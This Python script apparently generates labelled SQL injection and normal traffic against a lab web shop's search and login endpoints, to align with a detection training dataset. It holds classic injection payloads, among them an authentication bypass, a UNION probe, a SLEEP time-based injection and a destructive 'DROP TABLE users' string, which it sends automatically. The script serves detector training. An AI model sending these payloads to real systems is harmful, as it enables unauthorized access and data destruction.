"""Send SQL injection lab traffic aligned with Modified_SQL_Dataset.csv."""
from __future__ import annotations

import argparse
import random
import re
import sys
import time
from collections import Counter
from typing import Iterable, Optional

import requests

try:
    from attacker.dataset_payloads import (
        load_sqli_attack_payloads,
        load_sqli_normal_queries,
    )
    from attacker.normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url
except ImportError:  # running as `python attacker/sqli_attack.py`
    from dataset_payloads import load_sqli_attack_payloads, load_sqli_normal_queries
    from normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url

ATTACK_LABEL = "sqli"
NORMAL_LABEL = "normal"

# Fallback if CSV missing — still dataset-like classic injections
_FALLBACK_ATTACKS = [
    "admin' OR '1'='1' --",
    "1' OR 1=1 --",
    "' UNION SELECT null,null,null,null--",
    "1; DROP TABLE users;--",
    "1' OR SLEEP(2)--",
]
_FALLBACK_NORMALS = [
    "select version",
    "show tables",
    "user profile",
    "order history",
]


def pad_payload(payload: str) -> str:
    """Dataset-style padding: extra spaces around operators / parentheses / keywords."""
    out = payload
    for token in ("(", ")", "=", ";", ",", "||", "--", "#"):
        out = out.replace(token, f" {token} ")
    for kw in (
        "OR",
        "AND",
        "UNION",
        "SELECT",
        "FROM",
        "WHERE",
        "DROP",
        "TABLE",
        "SLEEP",
        "WAITFOR",
        "DELAY",
        "NULL",
    ):
        out = re.sub(rf"\b{kw}\b", f" {kw} ", out, flags=re.IGNORECASE)
    return re.sub(r"[ \t]+", " ", out).strip()


def expand_payloads(payloads: Iterable[str]) -> list[tuple[str, str]]:
    """Return (style, payload) pairs: compact + padded for each entry."""
    expanded: list[tuple[str, str]] = []
    for raw in payloads:
        expanded.append(("compact", raw))
        padded = pad_payload(raw)
        if padded != raw:
            expanded.append(("padded", padded))
        else:
            expanded.append(("padded", raw))
    return expanded


def _short_delay() -> None:
    time.sleep(random.uniform(0.03, 0.2))


def _send(
    session: requests.Session,
    method: str,
    url: str,
    *,
    label: str,
    counts: Counter,
    **kwargs,
) -> requests.Response:
    headers = kwargs.pop("headers", {})
    headers = {**headers, "X-Test-Label": label}
    kwargs.setdefault("timeout", 20)
    kwargs.setdefault("allow_redirects", False)
    response = session.request(method, url, headers=headers, **kwargs)
    counts[response.status_code] += 1
    _short_delay()
    return response


def run_attacks(base_url: str) -> tuple[Counter, Counter]:
    assert_safe_base_url(base_url)
    base = base_url.rstrip("/")
    attack_counts: Counter = Counter()
    normal_counts: Counter = Counter()
    session = requests.Session()
    session.headers["User-Agent"] = (
        "CyberMirror-SQLiAttack/1.0 (+lab; dataset-aligned)"
    )

    try:
        sqli_payloads = load_sqli_attack_payloads(limit=24)
        normal_search = load_sqli_normal_queries(limit=12)
    except Exception as exc:
        print(f"Dataset load failed ({exc}); using fallback payloads", file=sys.stderr)
        sqli_payloads = list(_FALLBACK_ATTACKS)
        normal_search = list(_FALLBACK_NORMALS)

    attack_payloads = expand_payloads(sqli_payloads)
    print(f"Target: {base}")
    print(
        f"Attack payloads from training CSV: {len(sqli_payloads)} unique "
        f"-> {len(attack_payloads)} after compact/padded"
    )
    print(f"Normal searches from training CSV: {len(normal_search)}")
    print()

    # Attack traffic on OrbitMart catalog + login (same sinks, dataset strings)
    for style, payload in attack_payloads:
        label = f"sqli_{style}"
        print(f"[sqli/{style}] search q={payload!r}")
        _send(
            session,
            "GET",
            f"{base}/search",
            label=label,
            counts=attack_counts,
            params={"q": payload},
        )

        print(f"[sqli/{style}] login username={payload!r}")
        _send(
            session,
            "POST",
            f"{base}/login",
            label=label,
            counts=attack_counts,
            data={"username": payload, "password": "AttackPass123!"},
        )

    for term in normal_search:
        print(f"[normal] search q={term!r}")
        _send(
            session,
            "GET",
            f"{base}/search",
            label=NORMAL_LABEL,
            counts=normal_counts,
            params={"q": term},
        )

    return attack_counts, normal_counts


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Lab SQLi traffic aligned to Modified_SQL_Dataset.csv"
    )
    parser.add_argument(
        "--base-url",
        default=DEFAULT_BASE_URL,
        help=f"CyberMirror base URL (default: {DEFAULT_BASE_URL})",
    )
    return parser.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = parse_args(argv)
    try:
        attack_counts, normal_counts = run_attacks(args.base_url)
    except requests.RequestException as exc:
        print(f"Request failed: {exc}", file=sys.stderr)
        return 1

    print()
    print("=== Summary (X-Test-Label: sqli) ===")
    print(f"Requests sent: {sum(attack_counts.values())}")
    print("Status codes:")
    for code in sorted(attack_counts):
        print(f"  {code}: {attack_counts[code]}")

    print()
    print("=== Summary (X-Test-Label: normal) ===")
    print(f"Requests sent: {sum(normal_counts.values())}")
    print("Status codes:")
    for code in sorted(normal_counts):
        print(f"  {code}: {normal_counts[code]}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
